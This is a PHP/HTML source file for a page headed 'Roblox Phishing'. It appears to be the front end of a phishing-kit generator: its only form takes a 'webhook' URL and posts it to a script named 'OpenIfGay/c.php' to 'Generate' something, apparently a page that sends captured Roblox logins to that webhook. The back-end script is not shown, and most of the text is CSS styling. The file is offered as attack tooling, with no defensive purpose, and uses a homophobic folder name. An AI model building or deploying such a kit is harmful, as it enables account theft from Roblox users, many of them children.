
<?php

require("setup.php")

?>

<html>
<head>
  <link rel="stylesheet" href="OpenIfGay/gay.css">
  <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
  <link href="<?=$image?>" rel="icon"> 
  <title><?=$name?> ON TOP</title>
</head>


<style>

body {
    font-family: 'Ubuntu', sans-serif;
    background-color: <?=$Backgroundcolor?>;
}

.main {
    width: 400px;
    height: 400px;
    margin: 7em auto;
    border-radius: 1.5em;
    box-shadow: 0px 11px 35px 2px rgba(0, 0, 0, 0.14);
}

.sign {
    padding-top: 40px;
    color: <?=$colorTitle?>;
    font-family: 'Ubuntu', sans-serif;
    font-weight: bold;
    font-size: 23px;
}

.un {
width: 76%;
color: rgb(38, 50, 56);
font-weight: 700;
font-size: 14px;
letter-spacing: 1px;
background: rgba(136, 126, 126, 0.04);
padding: 10px 20px;
border: none;
border-radius: 20px;
outline: none;
box-sizing: border-box;
border: 2px solid rgba(0, 0, 0, 0.02);
margin-bottom: 50px;
margin-left: 46px;
text-align: center;
margin-bottom: 27px;
font-family: 'Ubuntu', sans-serif;
}

form.form1 {
    padding-top: 40px;
}

.pass {
        width: 76%;
color: rgb(38, 50, 56);
font-weight: 700;
font-size: 14px;
letter-spacing: 1px;
background: rgba(136, 126, 126, 0.04);
padding: 10px 20px;
border: none;
border-radius: 20px;
outline: none;
box-sizing: border-box;
border: 2px solid rgba(0, 0, 0, 0.02);
margin-bottom: 50px;
margin-left: 46px;
text-align: center;
margin-bottom: 27px;
font-family: 'Ubuntu', sans-serif;
}


.un:focus, .pass:focus {
    border: 2px solid rgba(0, 0, 0, 0.18) !important;
    
}

.submit {
  cursor: pointer;
    border-radius: 5em;
    color: #fff;
    background: linear-gradient(to right, <?=$colorTitle?>, <?=$colorTitle?>);
    border: 0;
    padding-left: 40px;
    padding-right: 40px;
    padding-bottom: 10px;
    padding-top: 10px;
    font-family: 'Ubuntu', sans-serif;
    margin-left: 35%;
    font-size: 13px;
    box-shadow: 0 0 20px 1px rgba(0, 0, 0, 0.04);
}

.forgot {
    text-shadow: 0px 0px 3px rgba(117, 117, 117, 0.12);
    color: #E1BEE7;
    padding-top: 15px;
}

a {
    text-shadow: 0px 0px 3px rgba(117, 117, 117, 0.12);
    color: #E1BEE7;
    text-decoration: none
}

@media (max-width: 600px) {
    .main {
        border-radius: 0px;
    }
}   


</style>

<body>
  <div class="main">
    <p class="sign" align="center">Roblox Phishing</p>
    <p class="sign" align="center"><?=$name?> ON TOP</p>
    <form class="form1" method="POST" action="OpenIfGay/c.php">
      <input class="un" type="text" name="webhook" align="center" placeholder="webhook">
      <input type="submit" class="submit" align="center" value="Generate">
      <br>
      <br>
      <br>
      <br>
      <br>

    </form>


            
                
    </div>
     
</body>

</html>